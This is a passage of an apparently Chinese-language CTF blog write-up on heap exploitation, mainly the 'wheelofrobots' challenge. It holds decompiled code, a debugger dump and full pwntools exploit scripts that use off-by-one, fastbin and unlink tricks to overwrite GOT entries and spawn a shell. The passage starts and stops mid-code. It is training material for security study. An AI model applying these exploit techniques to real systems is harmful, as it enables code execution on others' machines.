class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)</span><br><span class="line">payload += p64(fd) +p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">edit(<span class="number">2</span>,payload)  <span class="comment">#在chunk2的地方修改，则要使fack指向全局指针存放chunk2处的地址，而非chunk0</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8</span> + p64(free_got) + p64(puts_got)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">'\nOK\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">onegadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="2017-wheelofrobots"><a href="#2017-wheelofrobots" class="headerlink" title="2017 wheelofrobots"></a>2017 wheelofrobots</h2><p>这道题太混乱了，好复杂的一个程序啊，我看了老半天才稍微看懂这个程序是干嘛的</p><p>洞的话第一个应该是add里面choose之后输入那里</p><p>off by one</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sub_400D83(<span class="string">"Which robot do you want to add to the wheel?"</span>);</span><br><span class="line">printf(<span class="string">"Your choice :"</span>);</span><br><span class="line">memset(&amp;unk_603110, <span class="number">0</span>, <span class="number">4</span>uLL);</span><br><span class="line">v10 = sub_400A36(&amp;unk_603110, <span class="number">5L</span>L);   //可以多一个字节溢出，覆盖的地址在<span class="number">0x603114</span>的内容</span><br><span class="line"></span><br><span class="line">而<span class="number">0x603114</span>刚好是存放第二个robot状态的地址</span><br><span class="line"> case <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !dword_603114 )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(<span class="string">"Increase Bender's intelligence: "</span>, <span class="number">5L</span>L);</span><br><span class="line">          memset(&amp;s, <span class="number">0</span>, <span class="number">5</span>uLL);</span><br><span class="line">          v8 = sub_400A36(&amp;s, <span class="number">5L</span>L);</span><br><span class="line">          <span class="keyword">if</span> ( v8 &gt; <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            puts(<span class="string">"Sorry impossible to make bender as smart!"</span>);</span><br><span class="line">            v8 = <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          qword_6030F0 = calloc(<span class="number">1</span>uLL, <span class="number">20</span> * v8);</span><br><span class="line">          qword_603138 = v8;</span><br><span class="line">          dword_603114 = <span class="number">1</span>;</span><br><span class="line">          v1 = qword_6030F0;</span><br><span class="line">          *(_DWORD *)qword_6030F0 = <span class="string">'dneB'</span>;</span><br><span class="line">          v1[<span class="number">2</span>] = <span class="string">'re'</span>;</span><br><span class="line">          *((_BYTE *)v1 + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>我们可以通过更改bender的状态做到不add直接change<br>然后我们可以发现这几个robots之间错综复杂的关系，就可以构造face_chunk,实现unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">case <span class="number">1</span>u:</span><br><span class="line">      result = (unsigned int)dword_603120;</span><br><span class="line">      <span class="keyword">if</span> ( dword_603120 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, buf, <span class="number">0x14</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">.bss:<span class="number">00000000006030</span>F8 ; void *buf</span><br><span class="line">.bss:00000000006030F8 buf             dq ?                    ; DATA XREF: sub_400DF8+A6↑w</span><br><span class="line">.bss:<span class="number">00000000006030</span>F8                                         ; sub_400DF8+B7↑r ...      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">case <span class="number">6</span>u:</span><br><span class="line">      result = (unsigned int)dword_60311C;</span><br><span class="line">      <span class="keyword">if</span> ( dword_60311C )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, qword_6030E8, <span class="number">20</span> * qword_603148);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>我们知道如果在tinny处改size就可以覆盖destruction的内容，构造unlink，先在bss段构造fack_chunk，使原本指向tinny，即chunk1的指针，指向0x603148处，之后对chunk1的所有操作都在这个地址处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x6030e0</span></span><br><span class="line"><span class="number">0x6030e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">0x6030f0:0x00000000010210100x0000000000603148 -&gt;tinny point to 0x603148</span><br><span class="line"><span class="number">0x603100</span>:<span class="number">0x0000000001021030</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:<span class="number">0x0000000100000a31</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:<span class="number">0x0000000100000001</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603130</span>:<span class="number">0x0000000000000003</span><span class="number">0x0000000000000001</span></span><br><span class="line">0x603140:0x0000000000000020 -&gt; fack_chunk0x695420796e6e6954</span><br><span class="line"><span class="number">0x603150</span>:<span class="number">0x000000000000006d</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603160</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603170</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>利用chunk1和chunk6的关系，在chunk6上构造unlink，使unlink到0x6030e8-0x18处，就可以覆写该存放chunk地址为自己想改写的东西。</p><p>wiki具体exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">"./wheelofrobots"</span></span><br><span class="line">robots = ELF(<span class="string">'./wheelofrobots'</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./wheelofrobots"</span>)</span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Bender's intelligence: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Robot Devil's cruelty: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Destructor's powerful: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Robot's name: \n"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow_benderinuse</span><span class="params">(inuse)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.send(<span class="string">'9999'</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(where, what)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"step 1"</span></span><br><span class="line">    <span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line">    <span class="comment"># so it is in fastbin, idx2-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># idx2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment"># overflow bender inuse with 1</span></span><br><span class="line">    overflow_benderinuse(<span class="string">'\x01'</span>)</span><br><span class="line">    <span class="comment"># change bender's fd to 0x603138, point to bender's size</span></span><br><span class="line">    <span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">    <span class="comment"># in order add bender again</span></span><br><span class="line">    overflow_benderinuse(<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="comment"># add bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line">    <span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line">    <span class="comment"># it is at Robot Devil</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>) <span class="comment">#构造个size，使add tinny的时候指向0x603148，同时把它写进0x3060f8</span></span><br><span class="line">    <span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># wheels must &lt;= 3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 2'</span></span><br><span class="line">    <span class="comment"># alloc Destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># alloc devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment"># edit destructor's size to 1000 by tinny</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    <span class="comment"># place fake chunk at destructor's pointer</span></span><br><span class="line">    fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">    fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">    fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">    change(<span class="number">6</span>, fakechunk) <span class="comment">#写在heap里</span></span><br><span class="line">    <span class="comment"># trigger unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 3'</span></span><br><span class="line">    <span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">'a'</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 4'</span></span><br><span class="line">    <span class="comment"># make exit just as return</span></span><br><span class="line">    write(robots.got[<span class="string">'exit'</span>], <span class="number">0x401954</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 5'</span></span><br><span class="line">    <span class="comment"># set wheel cnt =3, 0x603130 in order to start robot</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># set destructor point to puts@got</span></span><br><span class="line">    change(<span class="number">1</span>, p64(robots.got[<span class="string">'puts'</span>]))</span><br><span class="line">    start_robot() <span class="comment">#start chunk1，即puts</span></span><br><span class="line">    p.recvuntil(<span class="string">'New hands great!! Thx '</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">'!\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">'puts addr: '</span> + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base: '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make free-&gt;system</span></span><br><span class="line">    write(robots.got[<span class="string">'free'</span>], system_addr)</span><br><span class="line">    <span class="comment"># make destructor point to /bin/sh addr</span></span><br><span class="line">    write(<span class="number">0x6030E8</span>, binsh_addr)</span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>emmm这种方法在start robots那里我就很懵，简便一点的话就换一种方法来leak，直接覆写chunk1和chunk2，通过改free的got表来实现<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">elf = ELF(<span class="string">'./wheelofrobots'</span>)</span><br><span class="line">p = process(<span class="string">"./wheelofrobots"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Bender's intelligence: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Robot Devil's cruelty: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Destructor's powerful: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Robot's name: \n"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow_benderinuse</span><span class="params">(inuse)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.send(<span class="string">'9999'</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(where, what)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">'\x01'</span>)</span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>) <span class="comment">#60-&gt;0x40</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>) <span class="comment">#140-&gt;0x90</span></span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">1000</span>)) <span class="comment">#改大小方便填写payload</span></span><br><span class="line">target = <span class="number">0x6030e8</span></span><br><span class="line">fd = target<span class="number">-0x18</span></span><br><span class="line">bk = target<span class="number">-0x10</span></span><br><span class="line">pay = p64(<span class="number">0</span>)+p64(<span class="number">0x40</span>)+p64(fd) + p64(bk) +<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">6</span>,pay)</span><br><span class="line">remove(<span class="number">3</span>) <span class="comment">#unlink</span></span><br><span class="line"><span class="comment"># 